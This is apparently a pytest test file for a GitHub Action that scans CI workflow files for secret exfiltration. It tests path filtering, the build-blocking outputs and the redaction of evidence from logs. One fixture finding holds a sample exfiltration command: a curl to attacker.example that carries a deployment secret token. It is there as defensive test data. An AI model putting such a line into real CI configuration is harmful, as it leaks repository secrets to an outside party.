"""Tests for the GitHub Action CI exfiltration scan mode."""
from __future__ import annotations

import importlib.util
from pathlib import Path

import pytest


CHECK_PATH = Path(__file__).resolve().parents[1] / "check.py"


@pytest.fixture()
def action_module(monkeypatch, tmp_path):
    monkeypatch.setenv("VERISWARM_API_URL", "https://api.veriswarm.ai")
    monkeypatch.setenv("VERISWARM_API_ALLOWED_HOSTS", "api.veriswarm.ai")
    monkeypatch.setenv("GITHUB_WORKSPACE", str(tmp_path))

    spec = importlib.util.spec_from_file_location(
        f"veriswarm_action_check_{id(tmp_path)}", CHECK_PATH
    )
    assert spec and spec.loader
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def _write(path: Path, content: str) -> Path:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(content, encoding="utf-8")
    return path


def test_ci_exfil_payload_filters_sensitive_and_outside_files(
    action_module, monkeypatch, tmp_path, capsys
):
    workflow = _write(
        tmp_path / ".github" / "workflows" / "ci.yml",
        "name: ci\njobs:\n  test:\n    runs-on: ubuntu-latest\n",
    )
    _write(tmp_path / ".env", "TOKEN=should-not-be-scanned\n")
    _write(tmp_path.parent / "outside.yml", "name: outside\n")

    action_module.CI_SCAN_PATHS = ".github/workflows/*.yml,.env,../outside.yml"
    monkeypatch.setenv("GITHUB_BASE_REF", "main")

    diff_calls = []

    def fake_diff(path, base_ref):
        diff_calls.append((path, base_ref))
        return "@@ -1 +1 @@\n+uses: actions/checkout@v4\n"

    requests = []

    def fake_api_request(path, method="GET", body=None):
        requests.append((path, method, body))
        return {"findings": [], "highest_severity": "none", "blocked": False}

    outputs = {}
    monkeypatch.setattr(action_module, "_git_diff_for", fake_diff)
    monkeypatch.setattr(action_module, "api_request", fake_api_request)
    monkeypatch.setattr(action_module, "set_output", outputs.__setitem__)

    action_module.check_ci_exfil()

    assert len(requests) == 1
    path, method, body = requests[0]
    assert path == "/v1/suite/guard/scan-ci"
    assert method == "POST"
    assert body == {
        "files": [
            {
                "path": ".github/workflows/ci.yml",
                "content": workflow.read_text(encoding="utf-8"),
                "diff": "@@ -1 +1 @@\n+uses: actions/checkout@v4\n",
            }
        ]
    }
    assert diff_calls == [(".github/workflows/ci.yml", "main")]
    assert outputs == {
        "ci-exfil-blocked": "false",
        "ci-exfil-highest-severity": "none",
        "ci-exfil-findings": "0",
    }
    assert action_module.failures == []
    assert action_module.summary_lines == [
        "CI Exfil Scan: ✅ Clean (no exfiltration patterns)"
    ]

    captured = capsys.readouterr()
    assert "Skipped 2 CI file(s)" in captured.out
    assert "Scanning 1 CI file(s)" in captured.out


def test_ci_exfil_blocked_result_sets_outputs_and_failure_without_evidence_leak(
    action_module, monkeypatch, tmp_path, capsys
):
    _write(
        tmp_path / ".github" / "workflows" / "deploy.yml",
        "name: deploy\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n",
    )
    action_module.CI_SCAN_PATHS = ".github/workflows/*.yml"
    action_module.FAIL_ON_CI_EXFIL = True

    finding = {
        "severity": "critical",
        "path": ".github/workflows/deploy.yml",
        "line": 12,
        "check": "secret-egress",
        "recommendation": "Remove outbound network calls near secret usage.",
        "evidence": "curl https://attacker.example/?token=${{ secrets.DEPLOY_KEY }}",
    }

    def fake_api_request(path, method="GET", body=None):
        return {
            "findings": [finding],
            "highest_severity": "critical",
            "blocked": True,
            "enforcement_level": "block",
        }

    outputs = {}
    monkeypatch.setattr(action_module, "api_request", fake_api_request)
    monkeypatch.setattr(action_module, "set_output", outputs.__setitem__)

    action_module.check_ci_exfil()

    assert outputs == {
        "ci-exfil-blocked": "true",
        "ci-exfil-highest-severity": "critical",
        "ci-exfil-findings": "1",
    }
    assert action_module.failures == [
        "CI secret-exfiltration scan blocked the build (highest severity: "
        "critical, enforcement: block)"
    ]
    assert action_module.summary_lines == [
        "CI Exfil Scan: ❌ **1 finding(s)**, highest **critical** "
        "(enforcement: block, blocked: True)"
    ]

    captured = capsys.readouterr()
    assert "::error file=.github/workflows/deploy.yml,line=12::CI exfil" in captured.out
    assert "secret-egress" in captured.out
    assert "Remove outbound network calls near secret usage." in captured.out
    assert "attacker.example" not in captured.out
    assert "DEPLOY_KEY" not in captured.out


def test_ci_exfil_fail_flag_allows_blocked_result_without_failure(
    action_module, monkeypatch, tmp_path
):
    _write(tmp_path / "Dockerfile", "FROM alpine\nRUN echo ok\n")
    action_module.CI_SCAN_PATHS = "Dockerfile"
    action_module.FAIL_ON_CI_EXFIL = False

    def fake_api_request(path, method="GET", body=None):
        return {
            "findings": [{"severity": "high", "path": "Dockerfile", "check": "curl"}],
            "highest_severity": "high",
            "blocked": True,
            "enforcement_level": "monitor",
        }

    outputs = {}
    monkeypatch.setattr(action_module, "api_request", fake_api_request)
    monkeypatch.setattr(action_module, "set_output", outputs.__setitem__)

    action_module.check_ci_exfil()

    assert outputs["ci-exfil-blocked"] == "true"
    assert outputs["ci-exfil-highest-severity"] == "high"
    assert outputs["ci-exfil-findings"] == "1"
    assert action_module.failures == []
